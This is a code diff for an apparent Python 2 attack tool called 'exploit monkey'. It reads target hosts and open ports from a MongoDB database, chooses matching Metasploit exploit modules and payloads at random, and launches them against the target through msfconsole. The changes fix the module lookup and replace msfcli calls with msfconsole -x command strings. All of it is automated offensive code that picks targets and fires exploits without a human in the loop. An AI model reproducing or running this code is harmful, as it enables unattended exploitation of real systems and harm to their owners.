@@ -19,6 +19,7 @@ def findTargets (runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
         conn = MongoClient(dbIp,27017)
         db = conn[dbName]
         hosts = db.hosts
+        sploits = db.sploits
 
         if hosts.find({'location':monkeyLoc}).count() == 0:
             print 'Exploit monkey is waiting for work.  Eating bananas.  Will check again in 10 seconds.'
@@ -32,31 +33,33 @@ def findTargets (runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
 
             target = max(hostList,key=hostList.get)
             openPorts = db.hosts.find_one({'ip' : target})['ports']
-            sploitPort = openPorts[randint(0,len(openPorts)-1)]
 
-            for sploit in hosts.find({'port':str(sploitPort)}):
-                sploitFiles.append(sploit['modName'])
+            if len(openPorts) > 0:
+                sploitPort = openPorts[randint(0,len(openPorts)-1)]
 
-        if len(sploitFiles)  == 0: #debug
-            print 'No matching modules for selected target port ' + str(sploitPort) #debug
+                for sploit in sploits.find({'port':str(sploitPort)}):
+                    sploitFiles.append(sploit['modName'])
 
-        else:
-            launchedSploit = randint(0,len(sploitFiles)-1)
-            lhostIp = db.monkeys.find_one({'id':monkeyId})['ip']
-            payloadArray = getPayloads(launchedSploit)
-            startTime = time.ctime()
+            if len(sploitFiles)  == 0: #debug
+                print 'No matching modules for selected target port ' + str(sploitPort) #debug
 
-            if len(payloadArray) > 0:
-                subprocess.call(['msfcli',launchedSploit,payloadArray[randint(0,len(payloadArray)-1)],'RHOST='+str(target),'LHOST=' + lhostIp,'LPORT=4444','RPORT=' + str(sploitPort), 'E'])
-                endTime = time.ctime()
-                saveResults(db,hosts,target,sploitPort,startTime,endTime,monkeyId,launchedSploit)
+            else:
+                launchedSploit = sploitFiles[randint(0,len(sploitFiles)-1)]
+                lhostIp = db.monkeys.find_one({'id':monkeyId})['ip']
+                payloadArray = getPayloads(launchedSploit)
+                startTime = time.ctime()
 
-            return
+                if len(payloadArray) > 0:
+                    subprocess.call(['msfconsole','-x','\"use ' + launchedSploit + ';set PAYLOAD ' + payloadArray[randint(0,len(payloadArray)-1)] + ';set RHOST= ' +str(target) +  ';exploit;exit\"'])
+                    endTime = time.ctime()
+                    saveResults(db,hosts,target,sploitPort,startTime,endTime,monkeyId,launchedSploit)
 
 #Need to be able to launch a payload that can be used with selected exploit
 def getPayloads(sploitName):
     eligPayloads = []
-    proc = subprocess.Popen('msfcli ' + sploitName + ' P',stdout=subprocess.PIPE)
+    print sploitName #debug
+    proc = subprocess.Popen(['msfconsole', '-x', '\"use ' + sploitName + '; show payloads; exit\"'],stdout=subprocess.PIPE)
+    #print subprocess.list2cmdline(['msfcli', sploitName,'P']) debug
     for line in proc.stdout:
         if len(line.split()) > 0:
             if '/' in line.split()[0]:
